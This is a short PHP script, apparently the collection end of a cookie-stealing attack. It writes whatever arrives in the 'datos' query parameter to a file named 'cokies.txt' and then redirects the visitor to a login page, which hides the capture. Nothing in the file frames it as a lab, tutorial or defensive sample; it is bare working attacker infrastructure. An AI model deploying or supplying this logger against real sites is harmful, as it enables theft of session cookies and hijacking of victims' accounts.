<?php

	$file = fopen ("cokies.txt", "w");
	$info = $_GET['datos'];
	fwrite ($file, $info);
	fclose ($file);
	header ("Location: ../login.php");
?>